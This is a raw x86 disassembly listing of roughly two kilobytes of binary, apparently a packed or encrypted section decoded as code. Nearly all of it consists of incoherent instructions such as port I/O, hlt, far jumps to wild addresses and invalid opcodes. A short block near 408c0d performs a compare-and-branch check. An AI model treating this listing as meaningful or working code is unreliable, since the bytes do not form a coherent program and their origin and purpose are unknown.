  408acd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408acf:	fild   WORD PTR [ecx-0x68b9a17b]
  408ad5:	mov    ebp,0x1af3fd1d
  408ada:	gs sti 
  408adc:	fisub  DWORD PTR [eax+0x7c6898c5]
  408ae2:	loope  0x408a7b
  408ae4:	mov    ds,WORD PTR [edx-0x2a3b426d]
  408aea:	pop    ecx
  408aeb:	add    edi,DWORD PTR [edi]
  408aed:	sbb    ah,ah
  408aef:	cmp    esi,DWORD PTR [esi+edx*2-0x34]
  408af3:	out    dx,eax
  408af4:	das    
  408af5:	loop   0x408b10
  408af7:	inc    edx
  408af8:	cmp    eax,0x514e9952
  408afd:	fcomp  DWORD PTR [esp+eiz*8-0x4eb076b2]
  408b04:	mov    eax,0x59838530
  408b09:	scas   eax,DWORD PTR es:[edi]
  408b0a:	jecxz  0x408b2a
  408b0c:	or     DWORD PTR [ebx],esi
  408b0e:	test   BYTE PTR [ebp+0x43],cl
  408b11:	jo     0x408b2b
  408b13:	or     BYTE PTR [ebx-0x35],ch
  408b16:	sub    al,0x64
  408b18:	(bad)  
  408b19:	xchg   edx,eax
  408b1a:	sub    dl,BYTE PTR [esi]
  408b1c:	and    DWORD PTR [eax-0x2afb182b],eax
  408b22:	mov    cl,BYTE PTR [esi]
  408b24:	mov    eax,ds:0xe29e29b7
  408b29:	dec    ebx
  408b2a:	hlt    
  408b2b:	sub    ch,BYTE PTR [ebx-0x48fb0ac3]
  408b31:	jae    0x408ac1
  408b33:	xchg   ebx,eax
  408b34:	mov    bh,0x61
  408b36:	sbb    bh,0x1
  408b39:	rol    dl,cl
  408b3b:	leave  
  408b3c:	add    eax,ebx
  408b3e:	adc    dh,BYTE PTR [ebx]
  408b40:	pop    edx
  408b41:	and    ecx,esi
  408b43:	push   ebp
  408b44:	mov    esp,0xba27cd5e
  408b49:	pop    edx
  408b4a:	adc    cl,BYTE PTR [edi]
  408b4c:	mov    esp,eax
  408b4e:	add    eax,0xc31482ec
  408b53:	fadd   QWORD PTR [edi]
  408b55:	shl    BYTE PTR [ecx+0x7e3e0be2],1
  408b5b:	xlat   BYTE PTR ds:[ebx]
  408b5c:	push   es
  408b5d:	out    dx,eax
  408b5e:	inc    DWORD PTR [ebp+ebp*2-0x3ee7c635]
  408b65:	in     al,0x31
  408b67:	jmp    0xafd07222
  408b6c:	mov    BYTE PTR [esp+eiz*2+0x6b],0xdc
  408b71:	jns    0x408b08
  408b73:	pop    ds
  408b74:	in     al,dx
  408b75:	and    BYTE PTR [eax+0xd],bl
  408b78:	lea    esi,[edx-0x4e]
  408b7b:	outs   dx,BYTE PTR ds:[esi]
  408b7c:	inc    esp
  408b7d:	push   cs
  408b7e:	and    DWORD PTR [esi-0x5d599b94],0x16
  408b85:	mov    ch,0x49
  408b87:	or     esp,0x55b9487b
  408b8d:	jno    0x408bd3
  408b8f:	hlt    
  408b90:	jecxz  0x408b93
  408b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b93:	mov    BYTE PTR [esi+0x7a793ffb],ch
  408b99:	in     al,0xc9
  408b9b:	shl    edi,cl
  408b9d:	add    BYTE PTR [edx-0x5a],ch
  408ba0:	sbb    dh,BYTE PTR [ecx+ebp*2-0x45]
  408ba4:	mov    DWORD PTR [ecx+0xd],esi
  408ba7:	out    dx,eax
  408ba8:	add    edi,DWORD PTR [edx+0x76]
  408bab:	or     BYTE PTR [eax-0x59],0x4e
  408baf:	xchg   edi,eax
  408bb0:	outs   dx,BYTE PTR ds:[esi]
  408bb1:	(bad)  
  408bb2:	ja     0x408b48
  408bb4:	retf   0x2d69
  408bb7:	adc    ecx,DWORD PTR [ebx+eiz*2+0x1e]
  408bbb:	mov    ?,ebx
  408bbd:	ins    BYTE PTR es:[edi],dx
  408bbe:	pop    ss
  408bbf:	jae    0x408b7d
  408bc1:	sbb    dl,0x46
  408bc4:	and    cl,BYTE PTR [ecx-0x10c2c2bb]
  408bca:	pop    ebp
  408bcb:	gs cmp al,cl
  408bce:	add    al,0x73
  408bd0:	retf   0xedf2
  408bd3:	sub    eax,0xfd51a2bb
  408bd8:	push   0xb754359c
  408bdd:	push   es
  408bde:	mov    ds:0x5b42472,al
  408be3:	add    ah,BYTE PTR [eax]
  408be5:	mov    esp,DWORD PTR [ecx-0x70]
  408be8:	leave  
  408be9:	cmp    eax,0xf5acab02
  408bee:	inc    ebp
  408bef:	fsub   QWORD PTR [eax]
  408bf1:	pop    ebx
  408bf2:	inc    edi
  408bf3:	add    BYTE PTR ds:0xa6f17da6,cl
  408bf9:	push   ss
  408bfa:	sbb    ebx,DWORD PTR [ecx+edi*1-0x6be1a93a]
  408c01:	mov    ah,0xe4
  408c03:	inc    edx
  408c04:	iret   
  408c05:	arpl   WORD PTR [edx+0x47],sp
  408c08:	mov    al,ds:0xbdbd923c
  408c0d:	lea    eax,[eax+ecx*1+0x3272f5]
  408c14:	mov    DWORD PTR [ebp+0x8],eax
  408c17:	mov    eax,DWORD PTR [ebp-0xc]
  408c1a:	mov    ecx,DWORD PTR [ebp+0x14]
  408c1d:	xor    eax,esi
  408c1f:	add    eax,edi
  408c21:	imul   eax,DWORD PTR [ecx]
  408c24:	mov    ecx,DWORD PTR [ebp-0x4]
  408c27:	mov    edx,DWORD PTR [ebp+0x8]
  408c2a:	xor    ecx,esi
  408c2c:	lea    ecx,[ecx+edx*1+0x3272f5]
  408c33:	cmp    ecx,eax
  408c35:	jne    0x406849
  408c3b:	jmp    0x40afcd
  408c40:	or     eax,0xbf3c7fd1
  408c45:	mov    cl,BYTE PTR [edx]
  408c47:	into   
  408c48:	and    bl,BYTE PTR [ebx]
  408c4a:	and    eax,0x111a412a
  408c4f:	push   0x8383189c
  408c54:	or     al,0x5e
  408c56:	add    DWORD PTR [ebx-0x9fe1ad8],0xffffffbc
  408c5d:	jns    0x408c6c
  408c5f:	shl    esp,1
  408c61:	xor    cl,ah
  408c63:	pop    ds
  408c64:	or     edi,DWORD PTR [ebx+0x5abe10e1]
  408c6a:	(bad)  
  408c6b:	mov    es,WORD PTR [ebp-0x70c043c2]
  408c71:	sbb    esi,DWORD PTR [eax]
  408c73:	daa    
  408c74:	inc    edx
  408c75:	pop    ecx
  408c76:	push   ss
  408c77:	and    BYTE PTR [edx],0x18
  408c7a:	inc    esi
  408c7b:	inc    ecx
  408c7c:	dec    ebx
  408c7d:	xchg   ebp,eax
  408c7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c7f:	fwait
  408c80:	mov    fs,WORD PTR [edi]
  408c82:	inc    ebp
  408c83:	icebp  
  408c84:	dec    esi
  408c85:	pop    esp
  408c86:	xor    DWORD PTR [ebp+0x5d3fdfff],edx
  408c8c:	xlat   BYTE PTR ds:[ebx]
  408c8d:	(bad)  
  408c8e:	repnz sbb bh,BYTE PTR [eax+ebp*2+0x19]
  408c93:	sub    ebx,DWORD PTR [edx]
  408c95:	in     al,0xdc
  408c97:	mov    DWORD PTR [ebx+0x46],eax
  408c9a:	jo     0x408d02
  408c9c:	pop    ss
  408c9d:	adc    ebp,esi
  408c9f:	dec    ebx
  408ca0:	mov    edi,0x1c19c886
  408ca5:	mov    ds:0x9949266f,al
  408caa:	adc    ch,BYTE PTR [edi+0xb]
  408cad:	jecxz  0x408c8c
  408caf:	ins    BYTE PTR es:[edi],dx
  408cb0:	stos   BYTE PTR es:[edi],al
  408cb1:	in     al,0x10
  408cb3:	daa    
  408cb4:	ja     0x408c8c
  408cb6:	in     eax,dx
  408cb7:	pop    ds
  408cb8:	dec    edx
  408cb9:	mov    ebx,0xa8857c84
  408cbe:	outs   dx,BYTE PTR ds:[esi]
  408cbf:	es (bad) 
  408cc2:	add    BYTE PTR ss:[edi+0x4b53b371],dh
  408cc9:	pop    ds
  408cca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ccb:	out    0xe3,eax
  408ccd:	jp     0x408d1a
  408ccf:	push   cs
  408cd0:	mov    fs,ebx
  408cd2:	mov    ecx,0xd35b0a52
  408cd7:	push   edx
  408cd8:	xlat   BYTE PTR fs:[ebx]
  408cda:	dec    esp
  408cdb:	lods   al,BYTE PTR ds:[esi]
  408cdc:	int    0x4c
  408cde:	jge    0x408d28
  408ce0:	retf   
  408ce1:	bsr    ebx,DWORD PTR [ebx]
  408ce4:	enter  0xd1b2,0x69
  408ce8:	or     bh,BYTE PTR fs:[ebx+0x4433b614]
  408cef:	test   BYTE PTR [ebx],ch
  408cf1:	retf   
  408cf2:	stc    
  408cf3:	js     0x408c8c
  408cf5:	ror    BYTE PTR [eax],cl
  408cf7:	pop    edi
  408cf8:	xchg   BYTE PTR [edx+0x30],cl
  408cfb:	xor    BYTE PTR [edi],dh
  408cfd:	push   ecx
  408cfe:	popa   
  408cff:	mov    ds:0xb5bf8b71,eax
  408d04:	push   esp
  408d05:	std    
  408d06:	sub    edi,esp
  408d08:	dec    ebp
  408d09:	sub    eax,0xcd65c654
  408d0e:	in     al,dx
  408d0f:	or     dh,BYTE PTR ss:[ebx+0x13]
  408d13:	jle    0x408d47
  408d15:	pusha  
  408d16:	aas    
  408d17:	call   0x28fd:0xf120e157
  408d1e:	test   BYTE PTR [eax-0x403e2b4],0xb8
  408d25:	test   edi,edi
  408d27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d28:	jmp    0x2b946c63
  408d2d:	adc    ebp,DWORD PTR [ebx]
  408d2f:	push   ebx
  408d30:	cwde   
  408d31:	pusha  
  408d32:	les    ebx,FWORD PTR [esi+0x20]
  408d35:	jnp    0x408d16
  408d37:	mov    ebp,0x47af64ce
  408d3c:	fcmovbe st,st(2)
  408d3e:	dec    edx
  408d3f:	iret   
  408d40:	shr    DWORD PTR [ebx+0x71],cl
  408d43:	inc    ecx
  408d44:	or     DWORD PTR [ebp-0x6a],ecx
  408d47:	sbb    BYTE PTR [edx-0x42],al
  408d4a:	int3   
  408d4b:	aas    
  408d4c:	loopne 0x408d7f
  408d4e:	sbb    ah,al
  408d50:	jae    0x408d4b
  408d52:	(bad)  
  408d53:	mov    cl,0x80
  408d55:	and    BYTE PTR [esi-0xf],ch
  408d58:	sub    DWORD PTR [eax+edi*8-0x29],ecx
  408d5c:	add    eax,0xaac7a962
  408d61:	into   
  408d62:	mov    dh,ch
  408d64:	and    BYTE PTR [esi+0x4d1210f3],ah
  408d6a:	fwait
  408d6b:	adc    eax,0x3d3d0425
  408d70:	cdq    
  408d71:	dec    edx
  408d72:	adc    eax,0x885ffcdb
  408d77:	mov    ds:0x75287eab,al
  408d7c:	xor    DWORD PTR [esi-0x343578cc],esi
  408d82:	jle    0x408de4
  408d84:	lods   al,BYTE PTR ds:[esi]
  408d85:	pop    ebx
  408d86:	aam    0x5b
  408d88:	add    dh,bl
  408d8a:	jmp    0x408d48
  408d8c:	data16 hlt 
  408d8e:	xlat   BYTE PTR ds:[ebx]
  408d8f:	mov    ecx,0xa70532d6
  408d94:	test   DWORD PTR [edi-0x13],edx
  408d97:	add    ah,al
  408d99:	mov    bl,0x9a
  408d9b:	add    ebx,DWORD PTR [esi+0x511b7977]
  408da1:	mov    al,0x25
  408da3:	xor    edi,eax
  408da5:	fiadd  DWORD PTR [edi]
  408da7:	in     al,0x28
  408da9:	xchg   esi,eax
  408daa:	cdq    
  408dab:	ss adc ah,ah
  408dae:	or     al,0x21
  408db0:	cdq    
  408db1:	rcr    BYTE PTR [ebp-0x24],cl
  408db4:	and    al,0xde
  408db6:	lods   al,BYTE PTR ds:[esi]
  408db7:	das    
  408db8:	dec    edx
  408db9:	mov    esp,0xf013c6e4
  408dbe:	data16 sub al,0xd2
  408dc1:	call   0xbd2d:0x33def600
  408dc8:	fcmovne st,st(6)
  408dca:	xor    ebx,DWORD PTR [edx+0x72]
  408dcd:	mov    esi,0xbcc2b59d
  408dd2:	idiv   DWORD PTR [eax]
  408dd4:	inc    ebx
  408dd5:	mov    ebx,0x4435c21
  408dda:	call   0x30da:0x609624d3
  408de1:	and    al,0xff
  408de3:	lar    ecx,WORD PTR [edi+0x2bde27de]
  408dea:	xor    DWORD PTR [ebp+ebx*8-0x3dc07929],edx
  408df1:	gs pusha 
  408df3:	sub    eax,0x13d4a152
  408df8:	and    al,0x97
  408dfa:	sbb    eax,0x1ec40f2e
  408dff:	into   
  408e00:	mov    ah,0xc9
  408e02:	push   0xff37fa6
  408e07:	shl    DWORD PTR [ecx],1
  408e09:	cdq    
  408e0a:	mov    bh,0x36
  408e0c:	sub    eax,0x8276d921
  408e11:	pop    ds
  408e12:	push   esi
  408e13:	loope  0x408ddc
  408e15:	sbb    DWORD PTR [edx],ebp
  408e17:	dec    ecx
  408e18:	ins    BYTE PTR es:[edi],dx
  408e19:	neg    BYTE PTR [ebp-0x254ffc16]
  408e1f:	mov    ?,WORD PTR [esi+0x1cf33d1a]
  408e25:	ret    
  408e26:	outs   dx,BYTE PTR ds:[esi]
  408e27:	mov    BYTE PTR [eax-0x7ea9e423],0x57
  408e2e:	pop    esp
  408e2f:	xor    cl,0x13
  408e32:	mov    WORD PTR [edx],gs
  408e34:	shl    BYTE PTR [edx-0x66],0xae
  408e38:	sahf   
  408e39:	adc    esp,DWORD PTR [ecx]
  408e3b:	addr16 out dx,al
  408e3d:	aas    
  408e3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e3f:	daa    
  408e40:	call   0x694:0xac1e8304
  408e47:	jmp    0xc7d8b762
  408e4c:	mov    dl,0x4
  408e4e:	sub    bl,BYTE PTR [eax-0x17]
  408e51:	sbb    DWORD PTR [eax-0x57bc7552],esp
  408e57:	jmp    0x4dd59f39
  408e5c:	jne    0x408dfa
  408e5e:	or     ah,0x83
  408e61:	jnp    0x408e96
  408e63:	push   esp
  408e64:	xchg   ecx,eax
  408e65:	push   ecx
  408e66:	xor    DWORD PTR [eax-0x6e],0x2
  408e6a:	push   esi
  408e6b:	mov    eax,ds:0xf5268c4b
  408e70:	loope  0x408e83
  408e72:	xor    ecx,esi
  408e74:	popf   
  408e75:	pop    ds
  408e76:	sbb    dh,BYTE PTR [edi-0x466c6906]
  408e7c:	popf   
  408e7d:	jae    0x408ea3
  408e7f:	pushf  
  408e80:	jle    0x408e66
  408e82:	scas   eax,DWORD PTR es:[edi]
  408e83:	push   0x4e
  408e85:	retf   
  408e86:	lock add bl,BYTE PTR [ecx-0x3203783e]
  408e8d:	push   0x4703adaa
  408e92:	aad    0xf9
  408e94:	pop    edx
  408e95:	es cmp eax,0x300c482b
  408e9b:	adc    BYTE PTR [edi],dl
  408e9d:	sub    ecx,DWORD PTR [eax+ecx*2+0x17c5357c]
  408ea4:	fs scas al,BYTE PTR es:[edi]
  408ea6:	loope  0x408f20
  408ea8:	es aam 0xc
  408eab:	ins    BYTE PTR es:[edi],dx
  408eac:	shl    BYTE PTR ds:0x2c10eafe,cl
  408eb2:	mov    edi,0x7a7cc9b
  408eb7:	xchg   BYTE PTR [edi-0x5],bl
  408eba:	jle    0x408f30
  408ebc:	pusha  
  408ebd:	xor    ebx,ebx
  408ebf:	xlat   BYTE PTR ds:[ebx]
  408ec0:	mov    bl,0x8b
  408ec2:	lods   eax,DWORD PTR ds:[esi]
  408ec3:	xchg   ebp,eax
  408ec4:	pop    ebp
  408ec5:	stos   BYTE PTR es:[edi],al
  408ec6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ec7:	jg     0x408f27
  408ec9:	push   edi
  408eca:	mov    esi,0xbdebfb99
  408ecf:	sub    DWORD PTR [edi],eax
  408ed1:	xchg   edi,eax
  408ed2:	aad    0x50
  408ed4:	add    eax,0x32c69d6f
  408ed9:	scas   al,BYTE PTR es:[edi]
  408eda:	and    ch,dl
  408edc:	sbb    DWORD PTR [edx],esp
  408ede:	jns    0x408eaa
  408ee0:	rcl    DWORD PTR [edx+0xa451f4d],cl
  408ee6:	and    bh,ch
  408ee8:	sbb    DWORD PTR [esi+0x2e],ecx
  408eeb:	mov    cl,0x32
  408eed:	mov    BYTE PTR [eax-0x45e9c7d3],cl
  408ef3:	aas    
  408ef4:	ja     0x408ea0
  408ef6:	mov    cl,0xf4
  408ef8:	adc    eax,0x6a0ee581
  408efd:	dec    ebx
  408efe:	lods   al,BYTE PTR ds:[esi]
  408eff:	in     eax,0x85
  408f01:	or     al,0x8f
  408f03:	xor    al,dl
  408f05:	lahf   
  408f06:	pop    esi
  408f07:	ficom  DWORD PTR [esi]
  408f09:	jle    0x408eb7
  408f0b:	inc    esi
  408f0c:	into   
  408f0d:	rcr    DWORD PTR [edi+edi*8],1
  408f10:	jge    0x408eb9
  408f12:	sub    dh,BYTE PTR [ecx]
  408f14:	nop
  408f15:	daa    
  408f16:	scas   eax,DWORD PTR es:[edi]
  408f17:	jo     0x408f24
  408f19:	aam    0x4e
  408f1b:	or     BYTE PTR [ebx+0x4c],dh
  408f1e:	mul    BYTE PTR [ecx]
  408f20:	dec    eax
  408f21:	(bad)  
  408f22:	jbe    0x408f6c
  408f24:	sbb    BYTE PTR [edi-0x76],bl
  408f27:	mov    ecx,0x3b9d847
  408f2c:	repnz daa 
  408f2e:	leave  
  408f2f:	out    0xa9,al
  408f31:	(bad)  
  408f32:	mov    ecx,0x16bcecd
  408f37:	lods   eax,DWORD PTR ds:[esi]
  408f38:	adc    ah,BYTE PTR [edi-0x36]
  408f3b:	out    0xe5,eax
  408f3d:	cs int 0xad
  408f40:	mov    bh,0xbc
  408f42:	jnp    0x408fba
  408f44:	xor    dl,BYTE PTR [edx-0x3a2e7f82]
  408f4a:	sar    BYTE PTR [edi-0x54],1
  408f4d:	pusha  
  408f4e:	and    eax,0x2d73d3db
  408f53:	fcmovnb st,st(7)
  408f55:	xor    ch,dl
  408f57:	jmp    0x408f7b
  408f59:	shl    DWORD PTR [esi-0xb],cl
  408f5c:	push   ebp
  408f5d:	adc    eax,0xb66cd1b0
  408f62:	mov    cs,WORD PTR [ebp-0x46]
  408f65:	(bad)  
  408f67:	dec    eax
  408f68:	jno    0x408fa9
  408f6a:	push   ebx
  408f6b:	or     eax,0xf19eeb92
  408f70:	scas   al,BYTE PTR es:[edi]
  408f71:	pop    ebx
  408f72:	cmp    DWORD PTR ds:0x914acf62,eax
  408f78:	sahf   
  408f79:	jbe    0x408fb7
  408f7b:	call   0x390c7190
  408f80:	xor    bh,BYTE PTR [ecx]
  408f82:	pusha  
  408f83:	in     eax,0xb2
  408f85:	icebp  
  408f86:	daa    
  408f87:	addr16 retf 0x62ef
  408f8b:	pop    ebp
  408f8c:	aam    0xa5
  408f8e:	mov    cl,0x57
  408f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f91:	mov    eax,ds:0x32d21841
  408f96:	sahf   
  408f97:	icebp  
  408f98:	jmp    0x408f3b
  408f9a:	mov    WORD PTR [ebp-0x16],?
  408f9d:	into   
  408f9e:	push   es
  408f9f:	cmp    DWORD PTR [esi],0xffffff83
  408fa2:	test   BYTE PTR [ecx+0x35],0x9
  408fa6:	loope  0x408f91
  408fa8:	js     0x408fa0
  408faa:	popa   
  408fab:	out    0x8d,al
  408fad:	and    ah,BYTE PTR [edx-0x140cf2fc]
  408fb3:	in     al,0x8d
  408fb5:	pop    es
  408fb6:	ss daa 
  408fb8:	popa   
  408fb9:	inc    edi
  408fba:	sub    ch,BYTE PTR [edi+0x53d1b8b7]
  408fc0:	ror    al,1
  408fc2:	addr16 loopne 0x408ff3
  408fc5:	imul   ecx,DWORD PTR [edx],0x47ed7067
  408fcb:	loopne 0x408f8c
  408fcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fce:	pop    esp
  408fcf:	add    DWORD PTR [edx-0x45226407],esi
  408fd5:	push   ebp
  408fd6:	aas    
  408fd7:	mov    eax,0x2d06576f
  408fdc:	sbb    esp,ecx
  408fde:	dec    ebx
  408fdf:	aas    
  408fe0:	sbb    eax,0x9ec16a9a
  408fe5:	pop    edi
  408fe6:	ins    BYTE PTR es:[edi],dx
  408fe7:	mov    bl,0x35
  408fe9:	dec    eax
  408fea:	aas    
  408feb:	js     0x409028
  408fed:	hlt    
  408fee:	mov    eax,0x34d6930e
  408ff3:	cmp    al,0x37
  408ff5:	and    ah,dl
  408ff7:	jl     0x40902e
  408ff9:	push   es
  408ffa:	fnstsw WORD PTR [edx-0x28129cc9]
  409000:	pop    esi
  409001:	push   0x48
  409003:	fisttp WORD PTR [ecx+0x1a3625b5]
  409009:	jge    0x409035
  40900b:	test   al,0x6b
  40900d:	ret    
  40900e:	aas    
  40900f:	jecxz  0x408fe8
  409011:	mov    dh,0x7d
  409013:	sbb    eax,0xb8b4eb46
  409018:	in     al,0xb5
  40901a:	mov    eax,ds:0xc55fcc4d
  40901f:	mov    dh,0xcc
  409021:	loop   0x409040
  409023:	xchg   edi,eax
  409024:	(bad)  
  409025:	mov    dh,0x46
  409027:	enter  0xe7c0,0xce
  40902b:	cli    
  40902c:	push   esp
  40902d:	cmp    ebp,ecx
  40902f:	retf   
  409030:	or     al,0xc1
  409032:	mov    al,0xde
  409034:	or     BYTE PTR [edi+edx*1],ah
  409037:	sub    BYTE PTR [ecx+0x60],bh
  40903a:	jmp    0x8952:0x7e23bd96
  409041:	xor    BYTE PTR [ebp-0x1e],dl
  409044:	add    edx,DWORD PTR [ebp+0x2]
  409047:	or     ecx,DWORD PTR [ebx+0x20a3ddd0]
  40904d:	push   ss
  40904e:	addr16 mov dh,0x13
  409051:	fnstenv [edx]
  409053:	inc    eax
  409054:	leave  
  409055:	test   BYTE PTR [ecx+ebx*1-0x45],0xe7
  40905a:	loop   0x409001
  40905c:	push   esi
  40905d:	add    BYTE PTR [eax],cl
  40905f:	cwde   
  409060:	xor    al,0x2b
  409062:	dec    eax
  409063:	pop    esp
  409064:	std    
  409065:	cmp    eax,0xb6ebe060
  40906a:	loopne 0x409035
  40906c:	dec    di
  40906e:	dec    ebx
  40906f:	push   edx
  409070:	je     0x409086
  409072:	stos   DWORD PTR es:[edi],eax
  409073:	stos   DWORD PTR es:[edi],eax
  409074:	lea    eax,[eax]
  409076:	sub    al,0x81
  409078:	sub    eax,0xc277a808
  40907d:	aas    
  40907e:	xor    al,0xd
  409080:	leave  
  409081:	xor    ch,BYTE PTR [eax+0x53]
  409084:	add    eax,0xdee70e19
  409089:	add    DWORD PTR [ecx+0x6a13faf],ecx
  40908f:	xchg   edx,eax
  409090:	jns    0x40905a
  409092:	mov    ebx,0x446c00d0
  409097:	pop    esp
  409098:	pop    edi
  409099:	jl     0x40910c
  40909b:	xlat   BYTE PTR ds:[ebx]
  40909c:	out    0x37,al
  40909e:	pushf  
  40909f:	mov    bh,BYTE PTR [eax+0x4b]
  4090a2:	stos   BYTE PTR es:[edi],al
  4090a3:	inc    eax
  4090a4:	add    DWORD PTR ds:0xb5c4326d,ebp
  4090aa:	jmp    0x4090b2
  4090ac:	rol    dl,1
  4090ae:	cli    
  4090af:	ja     0x409076
  4090b1:	call   0x634591d
  4090b6:	jp     0x409119
  4090b8:	(bad)  
  4090b9:	xchg   esi,eax
  4090ba:	inc    ebp
  4090bb:	mov    DWORD PTR [ebp+0x34],edx
  4090be:	xchg   ebp,eax
  4090bf:	mov    dh,0xe2
  4090c1:	sbb    esp,DWORD PTR [esi]
  4090c3:	push   es
  4090c4:	js     0x409094
  4090c6:	mov    bh,0x8c
  4090c8:	and    eax,0xbcb18cf
  4090cd:	pop    es
  4090ce:	test   eax,0x9cdc9b88
  4090d3:	lea    edx,ds:0x9310783a
  4090d9:	inc    edx
  4090da:	add    al,0x1b
  4090dc:	adc    BYTE PTR [eax+0x28da509b],dl
  4090e2:	nop
  4090e3:	es cs in eax,0x22
  4090e7:	fsub   QWORD PTR [edx-0x21]
  4090ea:	add    DWORD PTR [edi],ecx
  4090ec:	test   eax,0x2a38cc34
  4090f1:	dec    esi
  4090f2:	push   DWORD PTR [edx]
  4090f4:	imul   ecx,DWORD PTR [esi+0x59],0xffffff9d
  4090f8:	fwait
  4090f9:	pusha  
  4090fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090fb:	dec    ecx
  4090fc:	test   BYTE PTR [eax+0x616f1cfd],dl
  409102:	pop    ds
  409103:	mov    cs,WORD PTR [ecx+0xa]
  409106:	out    dx,al
  409107:	adc    eax,0xbc4cef40
  40910c:	je     0x4090ce
  40910e:	xchg   ecx,eax
  40910f:	xchg   esp,eax
  409110:	sub    dl,BYTE PTR [edi-0x735f1dd4]
  409116:	adc    ecx,DWORD PTR [ebp-0x4a]
  409119:	pop    es
  40911a:	sub    DWORD PTR [eax+0x70c451c],ebx
  409120:	xchg   edx,eax
  409121:	fadd   DWORD PTR [edx+0x48]
  409124:	dec    eax
  409125:	(bad)  
  409126:	int3   
  409127:	sub    al,0xae
  409129:	scas   al,BYTE PTR es:[edi]
  40912a:	jmp    0xf6d25984
  40912f:	mov    ecx,0xd174e839
  409134:	mov    bl,0xf6
  409136:	pop    edx
  409137:	jle    0x4090de
  409139:	mov    ebx,0xc68801af
  40913e:	and    bh,cl
  409140:	mov    ecx,0xe7d9b406
  409145:	dec    edi
  409146:	mov    WORD PTR [ecx-0x32],fs
  409149:	jge    0x40917c
  40914b:	fidivr WORD PTR [edx-0x2b7f6641]
  409151:	data16 mov WORD PTR [ebx-0x5],?
  409155:	cmp    ah,cl
  409157:	ficomp WORD PTR [edi+0xd]
  40915a:	cmp    eax,0x59afc705
  40915f:	popa   
  409160:	cmp    ah,BYTE PTR [edx]
  409162:	mov    eax,ds:0xc7a2ea9c
  409167:	jns    0xc357484a
  40916d:	adc    eax,0x7d09e275
  409172:	pusha  
  409173:	icebp  
  409174:	mov    bh,0xe8
  409176:	mov    eax,ds:0xfeb6207f
  40917b:	sbb    BYTE PTR [eax],ch
  40917d:	mov    al,ds:0xf67fae80
  409182:	xchg   ebp,eax
  409183:	xchg   edx,eax
  409184:	or     ah,cl
  409186:	xchg   DWORD PTR [edx+0x1ded2c8],edx
  40918c:	sbb    al,0x4d
  40918e:	sub    ebp,edi
  409190:	push   0x53
  409192:	xchg   dh,bh
  409194:	add    BYTE PTR [ebp+0x5da8c3ce],ch
  40919a:	das    
  40919b:	dec    esi
  40919c:	sub    ebx,ebp
  40919e:	ja     0x409185
  4091a0:	call   0x6660:0xc6940ed5
  4091a7:	inc    esi
  4091a8:	fild   QWORD PTR [ecx+0x5ecc2a6a]
  4091ae:	scas   eax,DWORD PTR es:[edi]
  4091af:	xor    BYTE PTR ds:0xca0a2d6e,bl
  4091b5:	dec    ebp
  4091b6:	mov    bl,0xfc
  4091b8:	dec    ebx
  4091b9:	xor    al,0x56
  4091bb:	cmp    DWORD PTR [eax-0x54397f79],esp
  4091c1:	pop    edx
  4091c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091c3:	adc    al,0xfe
  4091c5:	fnstenv [edx+esi*4+0x1f]
  4091c9:	and    dl,dh
  4091cb:	setp   BYTE PTR [edx+ecx*4]
  4091cf:	fisttp DWORD PTR [esi-0x43fa5b78]
  4091d5:	adc    ch,ch
  4091d7:	das    
  4091d8:	inc    ebp
  4091d9:	pop    eax
  4091da:	cli    
  4091db:	cmc    
  4091dc:	lods   al,BYTE PTR ds:[esi]
  4091dd:	dec    ebp
  4091de:	xchg   ecx,eax
  4091df:	xchg   ebx,ebx
  4091e1:	fsub   DWORD PTR [ebx+0x41b7dc7b]
  4091e8:	(bad)  
  4091e9:	sbb    cl,dl
  4091eb:	cdq    
  4091ec:	shl    edi,cl
  4091ee:	add    BYTE PTR [esi+ebx*2-0x9dfb643],bh
  4091f5:	out    dx,eax
  4091f6:	or     DWORD PTR [eax],eax
  4091f8:	or     esi,edx
  4091fa:	stc    
  4091fb:	out    dx,al
  4091fc:	scas   al,BYTE PTR es:[edi]
  4091fd:	jmp    0xfb59a0e9
  409202:	pop    eax
  409203:	sahf   
  409204:	enter  0xc0f8,0x71
  409208:	and    cl,ah
  40920a:	les    ecx,FWORD PTR [esp+eax*1]
  40920d:	mov    eax,ds:0x66491375
  409212:	mov    ecx,0xeb052f1f
  409217:	call   0xd3ece02f
  40921c:	jle    0x409239
  40921e:	out    dx,eax
  40921f:	jbe    0x40923b
  409221:	adc    esi,ecx
  409223:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409224:	scas   eax,DWORD PTR es:[edi]
  409225:	int3   
  409226:	(bad)  
  409227:	into   
  409228:	xor    al,BYTE PTR [esi+0x2ee772e]
  40922e:	push   edx
  40922f:	rcr    BYTE PTR [edi],0xa
  409232:	iret   
  409233:	int3   
  409234:	xchg   esp,eax
  409235:	and    BYTE PTR [esi+0x2ab43d5],al
  40923b:	and    ebx,ebp
  40923d:	and    BYTE PTR [edx+edx*1],bh
  409240:	cs inc ecx
  409242:	add    al,0x1b
  409244:	(bad)  
  409245:	outs   dx,BYTE PTR ds:[esi]
  409246:	mov    ebp,0x7ed3242d
  40924b:	jmp    0x966b:0xc8e2ae45
  409252:	sub    ecx,eax
  409254:	inc    ebp
  409255:	pusha  
  409256:	and    dl,dh
  409258:	push   ds
  409259:	test   bl,0x2d
  40925c:	jne    0x4091ec
  40925e:	mov    ebx,0x2404cacf
  409263:	loopne 0x4092aa
  409265:	mov    ah,0x4e
  409267:	xor    al,BYTE PTR ds:0x50bf7440
  40926d:	xlat   BYTE PTR ds:[ebx]
  40926e:	pop    eax
  40926f:	mov    ah,0x5f
  409271:	jmp    0x744cb1ed
  409276:	fmul   st(0),st
  409278:	sbb    eax,0xa7f194e9
  40927d:	xor    cl,0x69
  409280:	xlat   BYTE PTR ds:[ebx]
  409281:	pop    esi
  409282:	out    0xdd,al
  409284:	pop    eax
  409285:	pop    es
  409286:	sub    al,0xf3
